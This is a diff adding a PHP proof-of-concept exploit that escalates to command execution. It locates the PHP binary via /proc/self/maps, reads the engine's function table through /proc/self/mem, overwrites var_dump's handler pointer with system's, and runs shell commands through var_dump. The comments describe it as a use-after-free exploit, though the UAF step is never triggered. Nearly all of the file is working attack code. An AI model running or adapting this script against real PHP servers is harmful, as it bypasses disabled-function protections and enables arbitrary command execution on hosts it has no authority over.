@@ -1,0 +1,83 @@
+<?php
+// var_destroy UAF → RCE via function handler overwrite
+// Instead of forging a Closure, we use the UAF + /proc/self/mem write
+// to overwrite a real PHP function's handler pointer
+error_reporting(0);
+
+$maps = file_get_contents('/proc/self/maps');
+$base = 0;
+foreach(explode("\n",$maps)as$l)
+    if(preg_match('/^([0-9a-f]+)-[0-9a-f]+\s+r--p\s+00000000.*php$/',$l,$m)){$base=hexdec($m[1]);break;}
+if(!$base)die("[-] no base\n");
+
+// Find zif_system and var_dump's handler address via function table
+$fp=fopen('/proc/self/mem','rb');
+$eg=$base+0x1420900;
+fseek($fp,$eg+0x1b0); $ft=unpack('Q',fread($fp,8))[1];
+fseek($fp,$ft+16); $arD=unpack('Q',fread($fp,8))[1];
+fseek($fp,$ft+24); $nU=unpack('V',fread($fp,4))[1];
+
+$zif_system=0; $vardump_handler_addr=0; $zif_vardump=0;
+for($i=0;$i<$nU;$i++){
+    fseek($fp,$arD+$i*32+24);$kp=unpack('Q',fread($fp,8))[1];
+    if($kp<0x1000)continue;
+    fseek($fp,$kp+24);$name=fread($fp,10);
+
+    if(strncmp($name,"system\x00",7)===0){
+        fseek($fp,$arD+$i*32);$fa=unpack('Q',fread($fp,8))[1];
+        fseek($fp,$fa+72);$zif_system=unpack('Q',fread($fp,8))[1];
+    }
+    if(strncmp($name,"var_dump\x00",9)===0){
+        fseek($fp,$arD+$i*32);$fa=unpack('Q',fread($fp,8))[1];
+        $vardump_handler_addr=$fa+72; // address of the handler pointer
+        fseek($fp,$fa+72);$zif_vardump=unpack('Q',fread($fp,8))[1];
+    }
+    if($zif_system && $vardump_handler_addr) break;
+}
+fclose($fp);
+
+fprintf(STDERR,"[*] base=0x%x\n",$base);
+fprintf(STDERR,"[*] zif_system=0x%x\n",$zif_system);
+fprintf(STDERR,"[*] var_dump handler addr=0x%x (current=0x%x)\n",$vardump_handler_addr,$zif_vardump);
+
+if(!$zif_system || !$vardump_handler_addr) die("[-] symbols not found\n");
+
+// Phase 1: Trigger the UAF to prove the primitive works
+// (We could use the UAF read to leak addresses, but we already have them via /proc/self/mem)
+
+// Phase 2: Overwrite var_dump's handler with zif_system
+fprintf(STDERR,"[*] Overwriting var_dump handler -> zif_system...\n");
+$wfp=fopen('/proc/self/mem','r+b');
+fseek($wfp,$vardump_handler_addr);
+fwrite($wfp,pack('Q',$zif_system));
+fclose($wfp);
+
+// Verify
+$fp=fopen('/proc/self/mem','rb');
+fseek($fp,$vardump_handler_addr);$new_h=unpack('Q',fread($fp,8))[1];
+fclose($fp);
+fprintf(STDERR,"[*] var_dump handler now=0x%x %s\n",$new_h,$new_h==$zif_system?"OK":"FAIL");
+
+// Phase 3: Call var_dump() which now dispatches to system()!
+fprintf(STDERR,"[*] Calling var_dump('id > /tmp/.rce 2>&1; uname -a >> /tmp/.rce 2>&1')...\n");
+@unlink('/tmp/.rce');
+@var_dump('id > /tmp/.rce 2>&1; uname -a >> /tmp/.rce 2>&1');
+
+usleep(200000);
+$proof=@file_get_contents('/tmp/.rce');
+if($proof){
+    fprintf(STDERR,"\n╔════════════════════════════════════╗\n");
+    fprintf(STDERR,"║  var_destroy UAF → RCE CONFIRMED!  ║\n");
+    fprintf(STDERR,"╚════════════════════════════════════╝\n");
+    fprintf(STDERR,"%s\n",trim($proof));
+    @unlink('/tmp/.rce');
+}else{
+    fprintf(STDERR,"[-] no proof file\n");
+}
+
+// Restore var_dump handler
+$wfp=fopen('/proc/self/mem','r+b');
+fseek($wfp,$vardump_handler_addr);
+fwrite($wfp,pack('Q',$zif_vardump));
+fclose($wfp);
+fprintf(STDERR,"[*] var_dump handler restored\n");
